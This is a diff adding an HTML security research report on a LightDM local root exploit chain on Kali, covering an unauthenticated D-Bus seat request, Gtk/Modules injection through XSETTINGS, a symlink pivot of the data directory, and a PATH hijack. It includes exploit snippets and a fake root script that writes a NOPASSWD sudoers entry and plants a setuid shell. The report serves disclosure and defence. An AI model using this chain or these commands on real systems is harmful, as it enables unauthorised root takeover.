@@ -1,0 +1,516 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>LightDM 1.33.1-4: Local Root Through an Untrusted X Server</title>
+<style>
+  :root {
+    --paper: #f7f0e4;
+    --panel: #fffaf2;
+    --ink: #2f261c;
+    --muted: #70614f;
+    --line: #e0cfb9;
+    --line-strong: #cbb79e;
+    --orange: #b95418;
+    --orange-deep: #8f3f12;
+    --orange-soft: #f0d8c2;
+    --orange-pale: #f8e8d8;
+    --code: #fffaf3;
+    --mono: "DejaVu Sans Mono", "Liberation Mono", monospace;
+    --sans: "Lato", "DejaVu Sans", sans-serif;
+    --serif: "Bitstream Charter", "Charter", "DejaVu Serif", serif;
+  }
+
+  @page {
+    size: A4;
+    margin: 12mm 14mm 12mm;
+    background: #f7f0e4;
+    @top-left {
+      content: "C-01  /  LightDM 1.33.1-4";
+      font-family: "Lato", sans-serif;
+      font-size: 7.5pt;
+      letter-spacing: 0.06em;
+      color: #8f3f12;
+    }
+    @top-right {
+      content: "Security report";
+      font-family: "Lato", sans-serif;
+      font-size: 7.5pt;
+      letter-spacing: 0.06em;
+      color: #70614f;
+    }
+    @bottom-left {
+      content: "Authorized lab reproduction only";
+      font-family: "Lato", sans-serif;
+      font-size: 7.2pt;
+      color: #70614f;
+    }
+    @bottom-right {
+      content: counter(page) " / " counter(pages);
+      font-family: "Lato", sans-serif;
+      font-size: 7.5pt;
+      color: #8f3f12;
+    }
+  }
+  @page:first {
+    @top-left { content: none; }
+    @top-right { content: none; }
+  }
+
+  * { box-sizing: border-box; }
+  html { background: #f7f0e4; }
+  body {
+    margin: 0;
+    background: #f7f0e4;
+    color: #2f261c;
+    font-family: var(--serif);
+    font-size: 9.05pt;
+    line-height: 1.36;
+    hyphens: auto;
+  }
+
+  h1, h2, h3, h4 {
+    font-family: var(--sans);
+    color: var(--ink);
+    font-weight: 700;
+    break-after: avoid;
+  }
+  h1 {
+    font-size: 23pt;
+    line-height: 1.07;
+    letter-spacing: -0.015em;
+    margin: 1.5mm 0 2.5mm;
+    max-width: 170mm;
+  }
+  h2 {
+    font-size: 12.8pt;
+    line-height: 1.18;
+    margin: 5mm 0 2mm;
+    padding-top: 2mm;
+    border-top: 1px solid var(--line-strong);
+  }
+  h3 {
+    font-size: 10.2pt;
+    line-height: 1.22;
+    margin: 3.6mm 0 1.2mm;
+    color: var(--orange-deep);
+  }
+  h2 + h3 { margin-top: 1.5mm; }
+  p { margin: 0 0 1.8mm; }
+  strong { color: var(--ink); }
+  em { color: var(--orange-deep); font-style: italic; }
+  a { color: var(--orange-deep); text-decoration: none; border-bottom: 0.4pt solid #d7a57e; }
+  ul, ol { margin: 1.5mm 0 2.5mm 5mm; padding: 0; }
+  li { margin: 0 0 1mm; }
+  code, kbd, samp {
+    font-family: var(--mono);
+    font-size: 0.84em;
+    color: #3b2c1e;
+    background: #fdf5ea;
+    border: 0.5pt solid #e8d8c4;
+    border-radius: 2px;
+    padding: 0 1.2pt;
+  }
+  pre {
+    font-family: var(--mono);
+    font-size: 6.7pt;
+    line-height: 1.27;
+    background: var(--code);
+    border: 0.6pt solid #e3d2bd;
+    border-left: 3pt solid var(--orange);
+    border-radius: 2px;
+    padding: 2.1mm 2.7mm;
+    margin: 1.4mm 0 2.3mm;
+    white-space: pre-wrap;
+    overflow-wrap: break-word;
+    tab-size: 4;
+    break-inside: avoid;
+  }
+  pre code { border: 0; padding: 0; background: transparent; font-size: inherit; }
+  .small { font-size: 8.1pt; color: var(--muted); }
+  .tiny { font-size: 7.2pt; color: var(--muted); }
+  .muted { color: var(--muted); }
+
+  .masthead {
+    padding: 0 0 3.8mm;
+    border-bottom: 2pt solid var(--orange);
+    margin-bottom: 3.8mm;
+  }
+  .kicker {
+    font-family: var(--sans);
+    font-size: 7.7pt;
+    font-weight: 700;
+    letter-spacing: 0.13em;
+    text-transform: uppercase;
+    color: var(--orange-deep);
+    margin-bottom: 2mm;
+  }
+  .dek {
+    font-family: var(--sans);
+    font-size: 10.4pt;
+    line-height: 1.35;
+    color: #4b3a29;
+    max-width: 170mm;
+    margin: 0 0 3mm;
+  }
+  .meta-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: var(--sans);
+    font-size: 8pt;
+    margin-top: 1mm;
+  }
+  .meta-table td {
+    padding: 1mm 1.7mm;
+    border-top: 0.5pt solid var(--line);
+    vertical-align: top;
+  }
+  .meta-table td:first-child {
+    width: 25mm;
+    white-space: nowrap;
+    hyphens: none;
+    color: var(--muted);
+    font-weight: 700;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    font-size: 7.2pt;
+  }
+  .severity {
+    display: inline-block;
+    font-family: var(--sans);
+    font-size: 7.5pt;
+    font-weight: 700;
+    letter-spacing: 0.04em;
+    color: #fffaf2;
+    background: var(--orange-deep);
+    border-radius: 2px;
+    padding: 0.7mm 2mm;
+    vertical-align: 1pt;
+  }
+
+  .lead {
+    font-size: 10.4pt;
+    line-height: 1.45;
+    color: #3c2e21;
+  }
+  .callout {
+    background: #fbf0e3;
+    border: 0.6pt solid #e4c5a6;
+    border-left: 3.4pt solid var(--orange);
+    border-radius: 2px;
+    padding: 2.1mm 3mm;
+    margin: 2.2mm 0;
+    break-inside: avoid;
+  }
+  .callout p:last-child { margin-bottom: 0; }
+  .callout-title {
+    font-family: var(--sans);
+    font-size: 8.4pt;
+    font-weight: 700;
+    letter-spacing: 0.05em;
+    text-transform: uppercase;
+    color: var(--orange-deep);
+    margin-bottom: 1.2mm;
+  }
+
+  table.data {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: var(--sans);
+    font-size: 7.7pt;
+    line-height: 1.3;
+    margin: 1.5mm 0 2.7mm;
+    break-inside: avoid;
+  }
+  table.data th {
+    text-align: left;
+    font-weight: 700;
+    color: #4b3420;
+    background: #efdfcc;
+    border-bottom: 0.8pt solid #cbb79e;
+    padding: 1.1mm 1.7mm;
+    vertical-align: bottom;
+  }
+  table.data td {
+    padding: 1.1mm 1.7mm;
+    border-bottom: 0.5pt solid #e5d5c0;
+    vertical-align: top;
+  }
+  table.data tr:last-child td { border-bottom: 0.8pt solid #cbb79e; }
+  table.data td code { font-size: 0.9em; }
+  .nowrap { white-space: nowrap; }
+
+  .grid-2 {
+    display: table;
+    width: 100%;
+    table-layout: fixed;
+    border-collapse: separate;
+    border-spacing: 4mm 0;
+    margin-left: -4mm;
+    margin-right: -4mm;
+  }
+  .grid-2 > div { display: table-cell; vertical-align: top; }
+
+  .diagram {
+    background: #fffaf2;
+    border: 0.6pt solid var(--line);
+    border-radius: 2px;
+    padding: 2mm 2.4mm 1.6mm;
+    margin: 2mm 0 3mm;
+    break-inside: avoid;
+  }
+  .diagram svg { display: block; width: 100%; height: auto; }
+  .diagram figcaption {
+    font-family: var(--sans);
+    font-size: 7.4pt;
+    line-height: 1.35;
+    color: var(--muted);
+    margin-top: 1.4mm;
+    padding-top: 1.1mm;
+    border-top: 0.5pt solid var(--line);
+  }
+  .diagram figcaption strong { color: #4b3420; }
+
+  .stage {
+    border-left: 2.2pt solid var(--orange-soft);
+    padding-left: 2.6mm;
+    margin: 2.2mm 0;
+    break-inside: avoid;
+  }
+  .stage h3 { margin-top: 0; }
+  .stage p:last-child { margin-bottom: 0; }
+  .stage-num {
+    font-family: var(--sans);
+    font-size: 7.4pt;
+    font-weight: 700;
+    color: var(--orange-deep);
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    margin-bottom: 0.5mm;
+  }
+
+  .file-label {
+    font-family: var(--sans);
+    font-size: 7.4pt;
+    font-weight: 700;
+    letter-spacing: 0.04em;
+    color: var(--orange-deep);
+    margin: 2.5mm 0 1mm;
+  }
+  .file-label code { background: transparent; border: 0; color: var(--orange-deep); padding: 0; }
+
+  .footer-note {
+    margin-top: 6mm;
+    padding-top: 2mm;
+    border-top: 0.6pt solid var(--line-strong);
+    font-family: var(--sans);
+    font-size: 7.3pt;
+    color: var(--muted);
+  }
+
+  .break-before { break-before: page; }
+  .avoid { break-inside: avoid; }
+  .no-break { break-inside: avoid; }
+
+  @media screen {
+    html { background: #efe4d3; }
+    body {
+      max-width: 205mm;
+      margin: 0 auto;
+      padding: 9mm 8mm 14mm;
+      box-shadow: 0 0 0 1px #d9c7af, 0 1px 8px rgba(70, 45, 20, 0.08);
+    }
+  }
+</style>
+</head>
+<body>
+
+<header class="masthead">
+  <div class="kicker">Security research report &middot; 28 October 2026</div>
+  <h1>LightDM 1.33.1-4: local root through an untrusted X server</h1>
+  <p class="dek">A local user on stock Kali can combine the public nested-seat D-Bus API, a malicious XSETTINGS manager, a Debian-specific shared-data symlink, and a PATH lookup to execute code as root. No password, user session, or custom host configuration is required.</p>
+  <table class="meta-table">
+    <tr><td>Severity</td><td><span class="severity">CRITICAL</span> &nbsp; local privilege escalation to root</td></tr>
+    <tr><td>Affected</td><td>Kali rolling 2026.3: <code>lightdm 1.33.1-4</code>, <code>lightdm-gtk-greeter 2.0.9-1</code>, GTK <code>3.24.52-2</code>. Debian sid exact package: <code>1.33.1-4</code>.</td></tr>
+  </table>
+</header>
+
+<h2>1. What the operator needs to know</h2>
+
+<h3>1.1 Three privilege levels, not one</h3>
+<p>LightDM is not a single process. The <strong>daemon</strong> runs as root and owns the system bus name. A <strong>seat</strong> is a display position; the default local seat is Seat0, and an <code>xremote</code> seat is a display LightDM does not start itself. The <strong>greeter</strong> is the login UI, and it runs as the unprivileged <code>lightdm</code> account. When a user logs in, LightDM forks a <strong>session child</strong>; that child starts as root so it can set up the session, then drops to the authenticated user. The exploit crosses from the greeter account back into the root daemon, then into the root phase of a session child.</p>
+
+<h3>1.2 D-Bus is the front door</h3>
+<p>D-Bus is the system-wide message bus. A process sends a method call to a bus name; the bus applies an XML policy and then delivers it to the owning process. For LightDM, the daemon owns <code>org.freedesktop.DisplayManager</code>. The default policy allows any local sender to call the DisplayManager, Seat, and Session interfaces; only <code>AddSeat</code> is denied. The daemon does not inspect the caller's UID or the D-Bus <code>sender</code> field in the <code>AddLocalXSeat</code> handler.</p>
+
+<h3>1.3 The greeter is a privileged client of an untrusted display</h3>
+<p>The greeter is a GTK application. The X server is a separate process, and XSETTINGS is a property on that server: a settings manager publishes values such as theme names and module lists, and clients read them. GTK3's <code>Gtk/Modules</code> setting is a list of shared objects loaded with <code>dlopen</code>. LightDM normally connects the greeter to the local trusted display. <code>AddLocalXSeat</code> breaks that assumption by allowing the caller to choose the display number. The user owns the display, so the user owns the settings the greeter reads.</p>
+
+<h3>1.4 The greeter channel is a second, narrower front door</h3>
+<p>LightDM gives the greeter a Unix socket file descriptor. The greeter sends binary messages to the daemon, including <code>START_SESSION</code>, <code>SET_LANGUAGE</code>, and <code>ENSURE_SHARED_DIR</code>. The root daemon handles these messages in <code>greeter.c</code>. <code>ENSURE_SHARED_DIR</code> takes a username and calls <code>shared_data_manager_ensure_user_dir()</code>; that function runs as root and applies UID, GID, and mode to a path under <code>USERS_DIR</code>. The handler does not authenticate the greeter or validate that the path is still inside the data tree.</p>
+
+<h3>1.5 Debian's path move creates the pivot</h3>
+<p>Upstream LightDM uses <code>USERS_DIR=/var/lib/lightdm-data</code>, which is normally root-owned, so a greeter cannot replace its parent. Debian patch 06 changes it to <code>/var/lib/lightdm/data</code>. The parent <code>/var/lib/lightdm</code> is owned by <code>lightdm</code>, so the greeter can rename <code>data</code> and create a symlink in its place. The sink in <code>shared-data-manager.c</code> builds <code>USERS_DIR/username</code> and calls <code>g_file_make_directory_with_parents()</code> followed by <code>g_file_set_attributes_from_info()</code>. GLib resolves the symlink components when applying attributes; there is no <code>openat</code>, <code>O_NOFOLLOW</code>, or <code>fchownat(AT_SYMLINK_NOFOLLOW)</code>.</p>
+
+
+<h2>2. The chain, stage by stage</h2>
+<p>The chain is easiest to read as three trust crossings. The user starts outside LightDM and asks the root daemon for a seat. The root daemon puts the greeter on the user's display, which turns the user's XSETTINGS into code in the greeter. The greeter then asks the root daemon to adjust a path that has been replaced with a symlink. The result is a directory the greeter can write; the next session start executes the planted binary as root.</p>
+
+<figure class="diagram">
+<svg viewBox="0 0 760 278" role="img" aria-label="Trust-boundary diagram for the four-stage LightDM chain">
+  <defs>
+    <marker id="fig1-arrow" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto">
+      <path d="M0,0 L8,4 L0,8 z" fill="#b95418"/>
+    </marker>
+  </defs>
+
+  <rect x="16" y="24" width="210" height="64" rx="4" fill="#f0d8c2" stroke="#cbb79e"/>
+  <text x="29" y="42" font-family="Lato, sans-serif" font-size="9.4" font-weight="700" fill="#2f261c">1 &middot; Attacker (uid 1000)</text>
+  <text x="29" y="58" font-family="DejaVu Sans Mono, monospace" font-size="7.6" fill="#4b3a29">dbus-send AddLocalXSeat(99)</text>
+  <text x="29" y="73" font-family="Lato, sans-serif" font-size="7.6" fill="#70614f">No password or session</text>
+
+  <rect x="255" y="24" width="210" height="64" rx="4" fill="#fffaf2" stroke="#cbb79e"/>
+  <text x="268" y="42" font-family="Lato, sans-serif" font-size="9.4" font-weight="700" fill="#2f261c">2 &middot; Root daemon</text>
+  <text x="268" y="58" font-family="DejaVu Sans Mono, monospace" font-size="7.6" fill="#4b3a29">xcb_connect(:99)</text>
+  <text x="268" y="73" font-family="Lato, sans-serif" font-size="7.6" fill="#70614f">starts greeter as lightdm</text>
+
+  <rect x="494" y="24" width="250" height="64" rx="4" fill="#f0d8c2" stroke="#cbb79e"/>
+  <text x="507" y="42" font-family="Lato, sans-serif" font-size="9.4" font-weight="700" fill="#2f261c">3 &middot; GTK greeter (lightdm)</text>
+  <text x="507" y="58" font-family="DejaVu Sans Mono, monospace" font-size="7.6" fill="#4b3a29">Gtk/Modules -&gt; libpwn.so</text>
+  <text x="507" y="73" font-family="Lato, sans-serif" font-size="7.6" fill="#70614f">dlopen() inside the greeter</text>
+
+  <rect x="16" y="155" width="210" height="76" rx="4" fill="#f8e8d8" stroke="#cbb79e" stroke-dasharray="3 2"/>
+  <text x="29" y="173" font-family="Lato, sans-serif" font-size="9.4" font-weight="700" fill="#2f261c">Attacker Xvfb :99</text>
+  <text x="29" y="189" font-family="DejaVu Sans Mono, monospace" font-size="7.6" fill="#4b3a29">owns _XSETTINGS_S0</text>
+  <text x="29" y="204" font-family="Lato, sans-serif" font-size="7.6" fill="#70614f">supplies Gtk/Modules</text>
+  <text x="29" y="219" font-family="Lato, sans-serif" font-size="7.6" fill="#70614f">the greeter trusts this display</text>
+
+  <rect x="255" y="155" width="210" height="76" rx="4" fill="#fffaf2" stroke="#cbb79e"/>
+  <text x="268" y="173" font-family="Lato, sans-serif" font-size="9.4" font-weight="700" fill="#2f261c">4 &middot; Root shared-data</text>
+  <text x="268" y="189" font-family="DejaVu Sans Mono, monospace" font-size="7.6" fill="#4b3a29">ensure_user_dir(&quot;bin&quot;)</text>
+  <text x="268" y="204" font-family="DejaVu Sans Mono, monospace" font-size="7.6" fill="#4b3a29">chown/chmod /usr/local/bin</text>
+  <text x="268" y="219" font-family="Lato, sans-serif" font-size="7.6" fill="#70614f">follows the data symlink</text>
+
+  <rect x="494" y="155" width="250" height="76" rx="4" fill="#f0d8c2" stroke="#cbb79e"/>
+  <text x="507" y="173" font-family="Lato, sans-serif" font-size="9.4" font-weight="700" fill="#2f261c">5 &middot; Root session child</text>
+  <text x="507" y="189" font-family="DejaVu Sans Mono, monospace" font-size="7.6" fill="#4b3a29">execlp(&quot;lightdm&quot;)</text>
+  <text x="507" y="204" font-family="Lato, sans-serif" font-size="7.6" fill="#70614f">next AddLocalXSeat</text>
+  <text x="507" y="219" font-family="Lato, sans-serif" font-size="7.6" fill="#70614f">fake runs as uid 0</text>
+
+  <line x1="226" y1="56" x2="251" y2="56" stroke="#b95418" stroke-width="1.5" marker-end="url(#fig1-arrow)"/>
+  <line x1="465" y1="56" x2="490" y2="56" stroke="#b95418" stroke-width="1.5" marker-end="url(#fig1-arrow)"/>
+  <line x1="226" y1="193" x2="490" y2="74" stroke="#b95418" stroke-width="1.5" stroke-dasharray="4 3" marker-end="url(#fig1-arrow)"/>
+  <line x1="620" y1="88" x2="490" y2="151" stroke="#b95418" stroke-width="1.5" marker-end="url(#fig1-arrow)"/>
+  <line x1="465" y1="193" x2="490" y2="193" stroke="#b95418" stroke-width="1.5" marker-end="url(#fig1-arrow)"/>
+  <line x1="700" y1="88" x2="700" y2="151" stroke="#b95418" stroke-width="1.5" marker-end="url(#fig1-arrow)"/>
+</svg>
+<figcaption><strong>Figure 1.</strong> The trust boundary, not a four-command checklist. The user owns the X display; the greeter trusts its XSETTINGS; the root shared-data manager trusts the greeter's username; the session child resolves a relative program name in the daemon's PATH.</figcaption>
+</figure>
+
+<div class="stage">
+  <div class="stage-num">Stage 1 &middot; ask the root daemon for a seat</div>
+  <h3>AddLocalXSeat is a public, unauthenticated D-Bus method</h3>
+  <p>The system bus policy allows the DisplayManager interface to every local user. The only denied member is the deprecated <code>AddSeat</code>; <code>AddLocalXSeat</code> is intentionally callable without root. The daemon's method handler does not check the caller's UID or the D-Bus <code>sender</code> field. It creates an <code>xremote</code> seat and sets the caller-supplied display number.</p>
+
+  <div class="file-label"><code>src/display-manager-service.c:230-246</code></div>
+  <pre><code>if (g_strcmp0 (method_name, "AddLocalXSeat") == 0)
+{
+    ...
+    gint display_number;
+    g_variant_get (parameters, "(i)", &amp;display_number);
+
+    g_autoptr(Seat) seat = NULL;
+    g_signal_emit (service, signals[ADD_XLOCAL_SEAT], 0,
+                   display_number, &amp;seat);
+
+    if (!seat)
+        g_dbus_method_invocation_return_error (...);
+    ...
+}</code></pre>
+
+  <p>For the xremote seat, the root daemon does not spawn an X server. It calls <code>xcb_connect_to_display_with_auth_info</code> on the address (the lab uses <code>:99</code>). The attacker starts <code>Xvfb :99 -ac</code>, so the root daemon and then the greeter connect to an attacker-owned display. The greeter is launched as the <code>lightdm</code> service account, not root.</p>
+</div>
+
+<div class="stage">
+  <div class="stage-num">Stage 2 &middot; turn XSETTINGS into greeter code</div>
+  <h3><code>Gtk/Modules</code> is a GTK-wide module list</h3>
+  <p>XSETTINGS is a property on the X server. A settings manager publishes a list of settings; GTK clients read them. The <code>Gtk/Modules</code> setting is a list of shared objects that GTK loads with <code>dlopen</code>. The implementation is a known GTK3 primitive (the same class as CVE-2026-76023, a Chromium GTK3 X11 sandbox escape). The new part here is the caller: the greeter is a privileged LightDM component attached to a display the attacker chose.</p>
+
+  <div class="file-label"><code>lab/xsettings_pwn.c &mdash; the attacker's XSETTINGS manager</code></div>
+  <pre><code>/* Own _XSETTINGS_S0, then publish one string setting. */
+XChangeProperty (d, win, _XSETTINGS_SETTINGS, ...);
+XSetSelectionOwner (d, _XSETTINGS_S0, win, CurrentTime);
+
+/* The value the greeter reads: */
+Gtk/Modules "/var/tmp/libpwn.so"</code></pre>
+
+  <p>The module's constructor runs inside the greeter process as <code>lightdm</code>. It has the greeter's environment and the greeter-to-server file descriptor in <code>LIGHTDM_TO_SERVER_FD</code>. The constructor can therefore do two things the greeter could do: manipulate files the <code>lightdm</code> user can manipulate, and send greeter protocol messages to the root daemon.</p>
+</div>
+
+<div class="stage">
+  <div class="stage-num">Stage 3 &middot; replace the data directory with a symlink</div>
+  <h3>The root daemon applies attributes through the symlink</h3>
+  <p>The Debian patch changes the compile-time path from <code>/var/lib/lightdm-data</code> to <code>/var/lib/lightdm/data</code>. The parent <code>/var/lib/lightdm</code> is owned by <code>lightdm</code>, so the greeter can rename the existing <code>data</code> directory and replace it with a symlink to <code>/usr/local</code>. The greeter then sends <code>ENSURE_SHARED_DIR("bin")</code> over its existing file descriptor.</p>
+
+  <div class="file-label"><code>src/shared-data-manager.c:75-115</code></div>
+  <pre><code>g_autofree gchar *path = g_build_filename (USERS_DIR, user, NULL);
+g_autoptr(GFile) file = g_file_new_for_path (path);
+
+gboolean result = g_file_make_directory_with_parents (file, NULL, &amp;error);
+if (error) {
+    if (g_error_matches (error, G_IO_ERROR, G_IO_ERROR_EXISTS)) {
+        g_clear_error (&amp;error);
+        result = TRUE;          /* existing /usr/local/bin is accepted */
+    }
+}
+
+g_file_info_set_attribute_uint32 (info, G_FILE_ATTRIBUTE_UNIX_UID, entry-&gt;pw_uid);
+g_file_info_set_attribute_uint32 (info, G_FILE_ATTRIBUTE_UNIX_GID, priv-&gt;greeter_gid);
+g_file_info_set_attribute_uint32 (info, G_FILE_ATTRIBUTE_UNIX_MODE, 0770);
+g_file_set_attributes_from_info (file, info,
+                                 G_FILE_QUERY_INFO_NONE, NULL, &amp;error);</code></pre>
+
+  <p><code>g_file_set_attributes_from_info()</code> with <code>G_FILE_QUERY_INFO_NONE</code> follows the intermediate symlink. Because <code>getpwnam("bin")</code> succeeds, the target attributes are UID 2 (<code>bin</code>), GID of the greeter (<code>lightdm</code>), and mode 0770. The directory <code>/usr/local/bin</code> is now group-writable by <code>lightdm</code>. The exploit does not need to create a new directory; the existing directory is precisely what makes the <code>EXISTS</code> branch accept the path.</p>
+
+  <div class="file-label"><code>lab/libpwn.c &mdash; the pivot</code></div>
+  <pre><code>rename ("/var/lib/lightdm/data", "/var/lib/lightdm/data.pwnold");
+symlink ("/usr/local", "/var/lib/lightdm/data");
+send_ensure_shared_dir ("bin");   /* root chown/chmod of /usr/local/bin */
+
+int fd = open ("/usr/local/bin/lightdm", O_WRONLY | O_CREAT | O_TRUNC, 0755);
+write (fd, fake_script, strlen (fake_script));
+close (fd);</code></pre>
+</div>
+
+<div class="stage">
+  <div class="stage-num">Stage 4 &middot; make the next session child execute the fake</div>
+  <h3><code>execlp</code> searches the daemon's PATH</h3>
+  <p>Every session start, including the greeter session, goes through <code>session_real_start()</code>. The root process forks and calls <code>execlp("lightdm", ...)</code> to re-enter its own binary in session-child mode. <code>execlp</code> searches the daemon's PATH. On Kali that path starts with <code>/usr/local/bin</code>, before <code>/usr/sbin</code>.</p>
+
+  <div class="file-label"><code>src/session.c:625</code></div>
+  <pre><code>priv-&gt;pid = fork ();
+if (priv-&gt;pid == 0)
+{
+    /* Run us again in session child mode */
+    execlp ("lightdm",
+            "lightdm",
+            "--session-child",
+            arg0, arg1, NULL);
+    _exit (EXIT_FAILURE);
+}</code></pre>
+
+  <p>After stage 3, the greeter writes a fake <code>/usr/local/bin/lightdm</code>. The exploit triggers a second <code>AddLocalXSeat(99)</code>; the daemon creates another greeter session, and <code>session_real_start</code> resolves the fake first. The fake runs as root, before the session child drops to <code>lightdm</code>. The lab fake writes a sudoers entry, copies <code>/bin/sh</code> to <code>/var/tmp/rootsh</code>, and makes that copy setuid. The order matters: <code>chown</code> clears the SUID bit, so the script chowns first and chmods 4755 second.</p>
+
+  <div class="file-label"><code>fake /usr/local/bin/lightdm</code></div>
+  <pre><code>#!/bin/sh
+id &gt; /tmp/root_evidence.txt
+echo 'attacker ALL=(ALL:ALL) NOPASSWD: ALL' &gt; /etc/sudoers.d/pwn
+chmod 0440 /etc/sudoers.d/pwn
+cp /bin/sh /var/tmp/rootsh
+chown root:root /var/tmp/rootsh
+chmod 4755 /var/tmp/rootsh</code></pre>
+</div>
+
+</body>
+</html>
